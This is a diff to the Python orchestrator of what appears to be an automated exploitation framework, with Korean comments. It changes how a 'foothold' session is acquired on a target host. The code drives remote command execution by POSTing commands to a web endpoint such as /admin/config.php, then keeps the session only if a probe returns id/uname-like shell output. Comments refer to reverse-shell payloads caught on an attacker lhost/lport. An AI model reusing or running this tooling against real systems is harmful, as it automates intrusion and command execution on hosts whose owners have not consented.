@@ -1433,16 +1433,20 @@ class Orchestrator:
             self.world.add_flag(kind, val)
 
     def _acquire_session(self, report, host):
-        """발판 세션 획득. PoC 종류에 따라 리버스셸/웹RCE 세션을 attach 해서 반환."""
-        # 웹 RCE PoC 가 식별됐으면 WebRceSession
+        """발판 세션 획득 + 성립 검증(헛발판 폐기). --exploit-exec/--auto-poc 전용."""
         from .shell_session import WebRceSession
         from .shell_transport import web_http_fn
-        if self.world.web_product and self.auto_poc:      # ← 실제 Python 조건(아래 주의!)
-            ws = WebRceSession(f"https://{self.world.target}/admin/config.php",
-                               "cmd", method="POST", inject="body")
-            ws.attach(web_http_fn)        # ← 실제 HTTP = RCE 실행 표면
-            return ws if ws.alive else None
-        # 역쉘 PoC 면: 페이로드 발사 후 catch_reverse_shell(lhost, lport) 수신
+        from .session_verify import looks_like_shell, verify_probe_command
+
+        if self.world.web_product and self.auto_poc:
+            # PoC 가 성립시킨 cmd 엔드포인트(없으면 기본 config.php) — ②에서 정교화
+            url = getattr(self, "rce_url", None) or f"https://{self.world.target}/admin/config.php"
+            ws = WebRceSession(url, "cmd", method="POST", inject="body")
+            ws.attach(web_http_fn)                       # ← 실제 HTTP (표면)
+            # ★ 성립 검증: id/uname 신호가 없으면 헛발판 → 폐기(거짓 '발판 확보' 방지)
+            if looks_like_shell(ws.run(verify_probe_command())):
+                return ws
+            return None
         return None
 
     def _prepare_revshells(self, report: OrchestrationReport) -> None:
